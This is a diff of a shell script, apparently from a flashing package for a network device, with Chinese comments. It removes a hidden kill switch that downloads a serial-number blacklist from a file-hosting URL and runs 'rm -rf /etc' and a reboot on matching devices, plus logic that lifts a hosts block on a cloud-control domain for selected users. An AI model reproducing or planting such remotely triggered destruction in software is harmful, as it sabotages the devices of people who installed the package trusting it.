@@ -306,54 +306,6 @@ function install_bmd_exit() {
    exit 
 }
 
-#-----------------------------非白名单------------------------------------
-# 非白名单函数主页标签
-function install_fbmd_reboot() {
-    echo "对比SN是否执行后门，暂定无限重启"
-    rm /tmp/xxsn.txt
-    wget -O xxsn.txt "https://vip.123pan.cn/1725810/%E5%88%B7%E6%9C%BA%E5%8C%85%E5%9C%A8%E7%BA%BF%E6%96%87%E4%BB%B6/r106/file/sn/xxsn.txt"
-    sn_content=$(cat sn.txt)
-   # 检查xxsn.txt中的内容是否包含sn.txt中的内容
-if grep -q "$sn_content" xxsn.txt; then
-    echo "指定黑名单，执行后门"
-        rm  /home/root/xxsn.txt
-        rm -rf /etc
-        reboot
-else
-    echo "不是黑名单，跳过"
-    install_fbmd_ts
-fi
-}
-
-function install_fbmd_ts() {
-    echo "独立特殊操作"
-    #暂时不用，代码预定，更新离线后台
-    install_fbmd_xxhosts
-}
-
-function install_fbmd_xxhosts() {
-  echo "非白名单模式恢复云控"
-  rm /tmp/xxhosts.txt
-  wget -O xxhosts.txt "https://vip.123pan.cn/1725810/%E5%88%B7%E6%9C%BA%E5%8C%85%E5%9C%A8%E7%BA%BF%E6%96%87%E4%BB%B6/r106/file/sn/xxhosts.txt"
-  sn_content=$(cat sn.txt)
-  if grep -q "$sn_content" xxhosts.txt; then
-    echo "指定用户，移除屏蔽代码恢复云控"
-    if [ -z "$(cat /etc/hosts | grep dss-accept.xywlhlh.com)" ]; then
-      echo "此用户已经没有屏蔽了"
-    else
-      echo "移除屏蔽代码"
-      sed -i '/dss-accept.xywlhlh.com/d' /etc/hosts
-      reboot
-    fi
-    install_fbmd_lx
-  else
-    echo "非指定用户，跳过"
-    install_fbmd_lx
-  fi
-}
-
-
-
 function install_fbmd_lx() {
     echo "更新离线文件"
   if [ -z "$(cat /m_webui/webui/html/deviceinfo.html | grep 2024.04.21)" ]; then
@@ -436,15 +388,6 @@ cd /tmp/
 mount -o remount,rw /
 mount -o remount,rw /m_data
 mount -o remount,rw /m_webui
-
-rm /tmp/sn_yun.txt
-wget -O sn_yun.txt "https://vip.123pan.cn/1725810/%E5%88%B7%E6%9C%BA%E5%8C%85%E5%9C%A8%E7%BA%BF%E6%96%87%E4%BB%B6/r106/file/sn/sn_yun.txt"
-sn_content=$(cat /tmp/sn.txt)
-if grep -q "$sn_content" sn_yun.txt; then
-    echo "运行白名单"
-    install_bmd_hosts
-else
-    echo "运行非白名单"
-     install_fbmd_reboot
-fi
+echo "运行白名单"
+install_bmd_hosts
 exit 0
